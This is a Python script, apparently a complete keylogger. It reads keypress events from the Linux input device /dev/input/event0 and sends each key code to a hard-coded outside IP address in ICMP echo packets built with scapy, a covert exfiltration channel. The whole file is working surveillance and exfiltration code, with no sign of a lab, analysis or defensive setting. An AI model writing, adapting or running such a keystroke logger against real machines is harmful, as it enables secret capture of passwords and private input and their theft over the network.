#!/usr/bin/env python3

import struct
import fcntl
import os
import time
from scapy.all import IP, ICMP, send

# Fixed device path and destination IP address
keyboard_device_path = '/dev/input/event0'  # Use event0 as the device
destination_ip = "100.64.3.37"  # Fixed IP address for ICMP packet destination

# ICMP function to send key data
def send_icmp_packet(key_data):
    ip_layer = IP(dst=destination_ip)
    icmp_layer = ICMP(type=8)  # Echo request
    packet = ip_layer / icmp_layer / key_data
    send(packet, verbose=False)

# Event structure format
EVENT_FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(EVENT_FORMAT)

try:
    # Open the device file in binary mode
    with open(keyboard_device_path, 'rb') as device_file:
        print(f"Listening for keystrokes on {keyboard_device_path}...")

        # Set the file to non-blocking mode
        fd = device_file.fileno()
        flags = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

        while True:
            try:
                # Try to read an event without blocking
                event = device_file.read(EVENT_SIZE)
                
                # Only process if event is not None and has the correct length
                if event and len(event) == EVENT_SIZE:
                    (tv_sec, tv_usec, type, code, value) = struct.unpack(EVENT_FORMAT, event)

                    # Filter for key press events (type 1) with value 1 (key down)
                    if type == 1 and value == 1:
                        key_data = str(code)  # Send key code as a string
                        print(f"Captured key code: {key_data}")
                        send_icmp_packet(key_data)
                        time.sleep(0.1)  # Small delay to avoid flooding
            except BlockingIOError:
                # EAGAIN/EWOULDBLOCK means no data is available yet
                time.sleep(0.1)  # Brief pause to avoid busy-waiting

finally:
    # Disable non-blocking mode when done
    fcntl.fcntl(fd, fcntl.F_SETFL, flags & ~os.O_NONBLOCK)

